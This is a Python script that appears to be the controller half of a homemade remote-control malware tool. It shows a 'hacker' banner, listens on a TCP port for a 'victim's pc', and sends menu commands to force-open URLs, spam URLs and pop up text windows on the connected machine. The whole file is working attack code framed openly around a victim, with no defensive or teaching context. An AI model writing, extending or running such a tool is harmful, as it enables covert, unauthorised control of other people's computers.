import socket
MENU = """
||||||||||||||||||||||||||||||
88                                88                              
88                                88                              
88                                88                              
88,dPPYba,  ,adPPYYba,  ,adPPYba, 88   ,d8  ,adPPYba, 8b,dPPYba,  
88P'    "8a ""     `Y8 a8"     "" 88 ,a8"  a8P_____88 88P'   "Y8  
88       88 ,adPPPPP88 8b         8888[    8PP""""""" 88          
88       88 88,    ,88 "8a,   ,aa 88`"Yba, "8b,   ,aa 88          
88       88 `"8bbdP"Y8  `"Ybbd8"' 88   `Y8a `"Ybbd8"' 88


options:
--|send_a_text_window[1]             [9]Exit_prog
--|force_open_url[2]     
--|url_spam+exit[3]             
  
||||||||||||||||||||||||||||||
"""

def server():
    """
    this function communicates with the user and returns to the user the output he wanted

    """
    # making a connection with tcp
    listening_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_address = ("10.0.0.14", 100)
    listening_sock.bind(server_address)
    listening_sock.listen(1)
    print("waiting for victim's pc....")
    client_soc, client_address = listening_sock.accept()
    print("connected!")
    print(MENU)
    while True:
        try:
            opt = input("Opt_==")
            client_soc.sendall(opt.encode())
            ans = client_soc.recv(1024).decode()
            if ans.find("exit_opt") == 0:
                exit()
            elif ans.find("error_opt") < 0:
                print("accepted_opt")
            else:
                print("error_opt")
                continue
        except Exception :
            print("--victim's_pc_is_offline!--")
            exit()

        try:
            data = input("Data_==")
            client_soc.sendall(data.encode())

            print("--success_data_successfully_reached_user--")
        except Exception:
            print("--victim's_pc_is_offline!--")
            exit()

        print(client_soc.recv(1024).decode())



def main():
    server()


if __name__ == '__main__':
    main()
